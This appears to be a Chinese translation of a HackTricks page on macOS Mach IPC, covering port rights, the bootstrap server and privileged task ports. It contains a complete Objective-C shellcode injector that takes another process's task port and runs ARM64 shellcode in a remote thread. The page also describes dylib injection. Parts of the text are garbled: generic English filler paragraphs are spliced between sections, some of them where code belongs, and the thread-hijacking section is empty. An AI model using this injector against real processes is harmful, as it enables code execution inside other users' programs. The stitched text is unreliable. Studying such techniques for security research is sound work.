# macOS IPC - Inter Process Communication

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们独家的[NFTs](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 通过端口进行Mach消息传递

### 基本信息

Mach使用**任务**作为共享资源的**最小单位**，每个任务可以包含**多个线程**。这些**任务和线程与POSIX进程和线程的映射是1:1**的。

任务之间的通信通过Mach进程间通信（IPC）进行，利用单向通信通道。**消息在端口之间传递**，端口类似于由内核管理的**消息队列**。

每个进程都有一个**IPC表**，可以在其中找到**进程的mach端口**。mach端口的名称实际上是一个数字（指向内核对象的指针）。

进程还可以将带有一些权限的端口名称**发送给另一个任务**，内核将使此条目出现在**另一个任务的IPC表**中。

### 端口权限

端口权限定义了任务可以执行的操作，对于这种通信至关重要。可能的**端口权限**包括（[此处的定义](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：

* **接收权限**，允许接收发送到端口的消息。Mach端口是MPSC（多生产者，单消费者）队列，这意味着整个系统中可能只有**一个接收权限**与每个端口相关联（与管道不同，多个进程可以持有指向一个管道读端的文件描述符）。
* 具有**接收权限**的任务可以接收消息并**创建发送权限**，从而使其能够发送消息。最初，只有**自己的任务**对其端口具有接收权限。
* **发送权限**，允许向端口发送消息。
* 发送权限可以**克隆**，因此拥有发送权限的任务可以克隆权限并将其授予第三个任务。
* **一次性发送权限**，允许向端口发送一条消息，然后消失。
* **端口集权限**，表示一个\_端口集\_而不是单个端口。从端口集中出列消息会从其中一个包含的端口中出列消息。端口集可用于同时监听多个端口，类似于Unix中的`select`/`poll`/`epoll`/`kqueue`。
* **死命名**，不是实际的端口权限，而只是一个占位符。当销毁端口时，所有现有的端口权限都变成死命名。

**任务可以将发送权限传输给其他任务**，使其能够发送消息回来。**发送权限也可以被克隆**，因此任务可以复制并将权限授予第三个任务。结合一个称为**引导服务器**的中间进程，可以实现任务之间的有效通信。

### 文件端口

文件端口允许在Mac端口中封装文件描述符（使用Mach端口权限）。可以使用`fileport_makeport`从给定的FD创建`fileport`，并使用`fileport_makefd`从`fileport`创建FD。

### 建立通信

#### 步骤：

如前所述，为了建立通信通道，**引导服务器**（mac中的**launchd**）参与其中。

1. 任务**A**初始化一个**新端口**，在进程中获得一个**接收权限**。
2. 作为接收权限持有者的任务**A**，为端口**生成一个发送权限**。
3. 任务**A**通过引导注册过程与**引导服务器**建立**连接**，提供**端口的服务名称**和**发送权限**。
4. 任务**B**与**引导服务器**交互，执行服务名称的引导**查找**。如果成功，**服务器复制从任务A接收的发送权限**并**传输给任务B**。
5. 获得发送权限后，任务**B**能够**制定**消息并将其**发送给任务A**。
6. 对于双向通信，通常任务**B**生成一个带有**接收权限**和**发送权限**的新端口，并将**发送权限提供给任务A**，以便其可以向任务B发送消息（双向通信）。

引导服务器**无法对**任务声称的服务名称进行**身份验证**。这意味着**任务**可能潜在地**冒充任何系统任务**，例如虚假**声明授权服务名称**，然后批准每个请求。

然后，Apple将**系统提供的服务名称**存储在安全配置文件中，位于受SIP保护的目录：`/System/Library/LaunchDaemons`和`/System/Library/LaunchAgents`。引导服务器将为这些服务名称创建并持有**接收权限**。

对于这些预定义服务，**查找过程略有不同**。当查找服务名称时，launchd会动态启动服务。新的工作流程如下：

* 任务**B**启动服务名称的引导**查找**。
* **launchd**检查任务是否正在运行，如果没有，则**启动**它。
* 任务**A**（服务）执行**引导签入**。在这里，**引导**服务器创建一个发送权限，保留它，并**将接收权限传输给任务A**。
* launchd复制**发送权限并发送给任务B**。
* 任务**B**生成一个带有**接收权限**和**发送权限**的新端口，并将**发送权限提供给任务A**（服务），以便其可以向任务B发送消息（双向通信）。

然而，此过程仅适用于预定义的系统任务。非系统任务仍按最初描述的方式运行，这可能导致潜在的冒充。

### 一个Mach消息

[在此处查找更多信息](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg`函数，本质上是一个系统调用，用于发送和接收Mach消息。该函数要求将消息作为初始参数发送。此消息必须以`mach_msg_header_t`结构开头，后跟实际消息内容。该结构定义如下：

```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```

拥有 _**接收权限**_ 的进程可以在 Mach 端口上接收消息。相反，**发送方** 被授予 _**发送权限**_ 或 _**一次性发送权限**_。一次性发送权限专门用于发送一条消息，之后将变为无效。

为了实现简单的 **双向通信**，进程可以在 mach **消息头** 中指定一个 **mach 端口**，称为 _回复端口_ (**`msgh_local_port`**)，消息的 **接收方** 可以向此消息 **发送回复**。`msgh_bits` 中的位标志可用于 **指示**应为此端口派生并传输 **一次性发送权限** (`MACH_MSG_TYPE_MAKE_SEND_ONCE`)。

{% hint style="success" %}
请注意，这种双向通信在期望回复的 XPC 消息中使用（`xpc_connection_send_message_with_reply` 和 `xpc_connection_send_message_with_reply_sync`）。但通常会像之前解释的那样创建不同的端口来创建双向通信。
{% endhint %}

消息头的其他字段包括：

* `msgh_size`：整个数据包的大小。
* `msgh_remote_port`：发送此消息的端口。
* `msgh_voucher_port`：[mach 优惠券](https://robert.sesek.com/2023/6/mach\_vouchers.html)。
* `msgh_id`：此消息的 ID，由接收方解释。

{% hint style="danger" %}
请注意，**mach 消息通过一个 \_mach 端口**\_\_ 发送，这是内置在 mach 内核中的 **单接收方**、**多发送方** 通信通道。**多个进程** 可以向 mach 端口 **发送消息**，但在任何时刻只有 **一个进程可以从中读取**。
{% endhint %}

### 枚举端口

```bash
lsmp -p <pid>
```

您可以从[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)下载iOS上的工具。

### 代码示例

请注意**发送方**如何**分配**一个端口，为名称`org.darlinghq.example`创建一个**发送权限**，并将其发送到**引导服务器**，同时发送方请求该名称的**发送权限**并使用它来**发送消息**。

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```

### macOS IPC - Inter-Process Communication

#### Introduction

Inter-Process Communication (IPC) is a mechanism that allows processes to communicate and share data with each other. macOS provides several IPC mechanisms, such as Mach ports, XPC services, and Distributed Objects. Understanding how IPC works is crucial for developing secure and efficient macOS applications.

#### Mach Ports

Mach ports are a fundamental IPC mechanism in macOS. They allow processes to send messages and data to each other. Mach ports are used by various system services and frameworks to communicate with eachjsonother. Developers can also use Mach ports to establish communication between their own processes.

#### XPC Services

XPC Services are a high-level IPC mechanism provided by macOS. They allow developers to create separate processes that can communicate with each other. XPC Services are commonly used for implementing background tasks and services in macOS applications.

#### Distributed Objects

Distributed Objects is another IPC mechanism in macOS that allows objects to be passed between processes. It enables developers to create distributed applications where objects can reside in different processes and communicate with each other transparently.

#### Conclusion

Understanding macOS IPC mechanisms is essential for building robust and secure applications. By leveraging IPC effectively, developers can create efficient and reliable macOS applications that provide a seamless user experience.

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```

### 特权端口

* **主机端口**：如果一个进程对这个端口有**发送**权限，他可以获取关于**系统**的**信息**（例如`host_processor_info`）。
* **主机特权端口**：拥有对这个端口的**发送**权限的进程可以执行像加载内核扩展这样的**特权操作**。**进程需要是root**才能获得这个权限。
* 此外，为了调用\*\*`kext_request`\*\* API，需要拥有其他授权\*\*`com.apple.private.kext*`\*\*，这些授权只赋予给苹果的二进制文件。
* **任务名称端口**：\_任务端口\_的非特权版本。它引用了任务，但不允许控制它。似乎唯一可以通过它获得的是`task_info()`。
* **任务端口**（又称内核端口）\*\*：拥有对这个端口的发送权限可以控制任务（读/写内存，创建线程等）。
* 调用`mach_task_self()`来为调用者任务获取此端口的**名称**。此端口仅在\*\*`exec()`\*\*跨进程继承；使用`fork()`创建的新任务会获得一个新的任务端口（作为一个特例，在suid二进制文件中`exec()`后任务也会获得一个新的任务端口）。生成任务并获取其端口的唯一方法是在执行`fork()`时执行["端口交换舞蹈"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)。
* 访问端口的限制（来自二进制文件`AppleMobileFileIntegrity`的`macos_task_policy`）：
  * 如果应用程序具有\*\*`com.apple.security.get-task-allow`授权\*\*，来自**相同用户的进程可以访问任务端口**（通常由Xcode用于调试）。**经过公证的**进程不会允许将其用于生产发布。
  * 具有\*\*`com.apple.system-task-ports`授权**的应用程序可以获取任何进程的**任务端口\*\*，除了内核。在旧版本中它被称为\*\*`task_for_pid-allow`\*\*。这仅授予给苹果应用程序。
  * **Root可以访问**未使用**强化**运行时编译的应用程序的任务端口（且不是来自苹果）。

### 通过任务端口在线程中注入Shellcode

您可以从以下位置获取一个shellcode：

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```

### macOS IPC (Inter-Process Communication)

#### macOS IPC Mechanisms

macOS provides several mechanisms for inter-process communication (IPC), including:

* **Mach Messages**: Low-level messaging system used by the kernel and various system services.
* **XPC Services**: High-level API for creating and managing inter-process communication.
* **Distributed Objects**: Deprecated framework for IPC, replaced by XPC Services.
* **Apple Events**: Inter-application communication mechanism using Apple events.

#### IPC Security Considerations

When designing applications that use IPC mechanisms, consider the following security best practices:

* **Use Secure Communication**: Encrypt sensitive data transmitted via IPC.
* **Validate Input**: Sanitize and validate input received through IPC to prevent injection attacks.
* **Implement Access Controls**: Use entitlements and permissions to restrict access to IPC endpoints.
* **Avoid Trusting IPC Data**: Treat data received through IPC as untrusted and validate it before use.
* **Monitor IPC Traffic**: Monitor IPC communications for suspicious activity or unauthorized access.

By following these best practices, you can enhance the security of your macOS applications that utilize IPC mechanisms.

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```

**编译**前面的程序并添加**权限**以能够使用相同用户注入代码（如果不是，则需要使用**sudo**）。

<details>

<summary>sc_injector.m</summary>

\`\`\`objectivec // gcc -framework Foundation -framework Appkit sc\_injector.m -o sc\_injector

\#import \<Foundation/Foundation.h> #import \<AppKit/AppKit.h> #include \<mach/mach\_vm.h> #include \<sys/sysctl.h>

\#ifdef **arm64**

kern\_return\_t mach\_vm\_allocate ( vm\_map\_t target, mach\_vm\_address\_t \*address, mach\_vm\_size\_t size, int flags );

kern\_return\_t mach\_vm\_write ( vm\_map\_t target\_task, mach\_vm\_address\_t address, vm\_offset\_t data, mach\_msg\_type\_number\_t dataCnt );

\#else #include \<mach/mach\_vm.h> #endif

\#define STACK\_SIZE 65536 #define CODE\_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala char injectedCode\[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";

int inject(pid\_t pid){

task\_t remoteTask;

// Get access to the task port of the process we want to inject into kern\_return\_t kr = task\_for\_pid(mach\_task\_self(), pid, \&remoteTask); if (kr != KERN\_SUCCESS) { fprintf (stderr, "Unable to call task\_for\_pid on pid %d: %d. Cannot continue!\n",pid, kr); return (-1); } else{ printf("Gathered privileges over the task port of process: %d\n", pid); }

// Allocate memory for the stack mach\_vm\_address\_t remoteStack64 = (vm\_address\_t) NULL; mach\_vm\_address\_t remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate(remoteTask, \&remoteStack64, STACK\_SIZE, VM\_FLAGS\_ANYWHERE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach\_error\_string(kr)); return (-2); } else {

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64); }

// Allocate memory for the code remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate( remoteTask, \&remoteCode64, CODE\_SIZE, VM\_FLAGS\_ANYWHERE );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach\_error\_string(kr)); return (-2); }

// Write the shellcode to the allocated memory kr = mach\_vm\_write(remoteTask, // Task port remoteCode64, // Virtual Address (Destination) (vm\_address\_t) injectedCode, // Source 0xa9); // Length of the source

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach\_error\_string(kr)); return (-3); }

// Set the permissions on the allocated code memory kr = vm\_protect(remoteTask, remoteCode64, 0x70, FALSE, VM\_PROT\_READ | VM\_PROT\_EXECUTE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Set the permissions on the allocated stack memory kr = vm\_protect(remoteTask, remoteStack64, STACK\_SIZE, TRUE, VM\_PROT\_READ | VM\_PROT\_WRITE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Create thread to run shellcode struct arm\_unified\_thread\_state remoteThreadState64; thread\_act\_t remoteThread;

memset(\&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK\_SIZE / 2); // this is the real stack //remoteStack64 -= 8; // need alignment of 16

const char\* p = (const char\*) remoteCode64;

remoteThreadState64.ash.flavor = ARM\_THREAD\_STATE64; remoteThreadState64.ash.count = ARM\_THREAD\_STATE64\_COUNT; remoteThreadState64.ts\_64.\_\_pc = (u\_int64\_t) remoteCode64; remoteThreadState64.ts\_64.\_\_sp = (u\_int64\_t) remoteStack64;

printf ("Remote Stack 64 0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread\_create\_running(remoteTask, ARM\_THREAD\_STATE64, // ARM\_THREAD\_STATE64, (thread\_state\_t) \&remoteThreadState64.ts\_64, ARM\_THREAD\_STATE64\_COUNT , \&remoteThread );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to create remote thread: error %s", mach\_error\_string (kr)); return (-3); }

return (0); }

pid\_t pidForProcessName(NSString \*processName) { NSArray \*arguments = @\[@"pgrep", processName]; NSTask \*task = \[\[NSTask alloc] init]; \[task setLaunchPath:@"/usr/bin/env"]; \[task setArguments:arguments];

NSPipe \*pipe = \[NSPipe pipe]; \[task setStandardOutput:pipe];

NSFileHandle \*file = \[pipe fileHandleForReading];

\[task launch];

NSData \*data = \[file readDataToEndOfFile]; NSString \*string = \[\[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid\_t)\[string integerValue]; }

BOOL isStringNumeric(NSString _str) { NSCharacterSet_ nonNumbers = \[\[NSCharacterSet decimalDigitCharacterSet] invertedSet]; NSRange r = \[str rangeOfCharacterFromSet: nonNumbers]; return r.location == NSNotFound; }

int main(int argc, const char \* argv\[]) { @autoreleasepool { if (argc < 2) { NSLog(@"Usage: %s ", argv\[0]); return 1; }

NSString \*arg = \[NSString stringWithUTF8String:argv\[1]]; pid\_t pid;

if (isStringNumeric(arg)) { pid = \[arg intValue]; } else { pid = pidForProcessName(arg); if (pid == 0) { NSLog(@"Error: Process named '%@' not found.", arg); return 1; } else{ printf("Found PID of process '%s': %d\n", \[arg UTF8String], pid); } }

inject(pid); }

return 0; }

````
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
````

#### 通过任务端口在线程中进行Dylib注入

在 macOS 中，**线程** 可能通过 **Mach** 或使用 **posix `pthread` api** 进行操作。我们在前面的注入中生成的线程是使用 Mach api 生成的，因此**不符合 posix 标准**。

可以**注入简单的 shellcode** 来执行命令，因为它**不需要与 posix 兼容的 api 一起工作**，只需要与 Mach 一起。**更复杂的注入** 需要**线程** 也符合 **posix 标准**。

因此，为了**改进线程**，应该调用 **`pthread_create_from_mach_thread`**，这将**创建一个有效的 pthread**。然后，这个新的 pthread 可以**调用 dlopen** 从系统中**加载一个 dylib**，因此，不需要编写新的 shellcode 来执行不同的操作，可以加载自定义库。

您可以在这里找到**示例 dylibs**（例如生成日志然后您可以监听它的 dylib）：

#### macOS IPC (Inter-Process Communication)

Inter-Process Communication (IPC) mechanisms are essential for processes to communicate with each other. macOS provides various IPC mechanisms such as Mach ports, XPC services, and UNIX domain sockets. Understanding how these mechanisms work is crucial for both developers and security professionals to ensure secure communication between processes.

```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```

#### 通过任务端口进行线程劫持 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

在这种技术中，进程的一个线程被劫持：

### XPC

#### 基本信息

XPC代表XNU（macOS使用的内核）进程间通信，是macOS和iOS上进程之间通信的框架。XPC提供了一种机制，用于在系统上不同进程之间进行安全的异步方法调用。这是苹果安全范式的一部分，允许创建特权分离的应用程序，其中每个组件仅以执行其工作所需的权限运行，从而限制受损进程可能造成的潜在损害。

有关此通信工作方式及其可能存在的漏洞的更多信息，请查看：

### MIG - Mach接口生成器

MIG旨在简化Mach IPC代码创建过程。它基本上为服务器和客户端生成所需的通信代码。即使生成的代码很丑陋，开发人员只需导入它，他的代码将比以前简单得多。

有关更多信息，请查看：

### 参考资料

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

</details>
